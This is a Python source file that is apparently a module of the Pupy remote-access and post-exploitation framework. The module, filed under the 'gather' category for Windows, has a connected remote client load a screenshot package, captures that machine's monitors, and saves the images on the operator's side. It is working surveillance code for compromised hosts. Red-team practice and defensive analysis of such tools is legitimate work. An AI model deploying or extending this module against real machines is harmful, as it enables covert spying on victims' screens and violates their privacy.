# -*- coding: UTF8 -*-

# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import *
import os
import os.path
import textwrap
import logging
import datetime
from zlib import compress, crc32
import struct
import subprocess

__class_name__="Screenshoter"

def pil_save(filename, pixels, width, height):
	from PIL import Image, ImageFile
	buffer_len = (width * 3 + 3) & -4
	img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
	ImageFile.MAXBLOCK = width * height
	img=img.transpose(Image.FLIP_TOP_BOTTOM)
	img.save(filename, quality=95, optimize=True, progressive=True)
	logging.info('Screenshot saved to %s'%filename)


@config(cat="gather", compat="windows")
class Screenshoter(PupyModule):
	""" take a screenshot :) """

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
		self.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
		self.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
		self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')

	def run(self, args):
		try:
			os.makedirs(os.path.join("data","screenshots"))
		except Exception:
			pass
		self.client.load_package("pupwinutils.screenshot")
		screens=None
		if args.screen is None:
			screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors(oneshot=True)
		else:
			screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors()
		if args.enum:
			res=""
			for i, screen in enumerate(screens):
				res+="{:<3}: {}\n".format(i,screen)
			return res
		if args.screen is None:
			args.screen=0
		selected_screen=screens[args.screen]
		screenshot_pixels=self.client.conn.modules["pupwinutils.screenshot"].get_pixels(selected_screen)
		filepath=os.path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
		pil_save(filepath, screenshot_pixels, selected_screen["width"], selected_screen["height"])
		if args.view:
			subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
		self.success("screenshot saved to %s"%filepath)


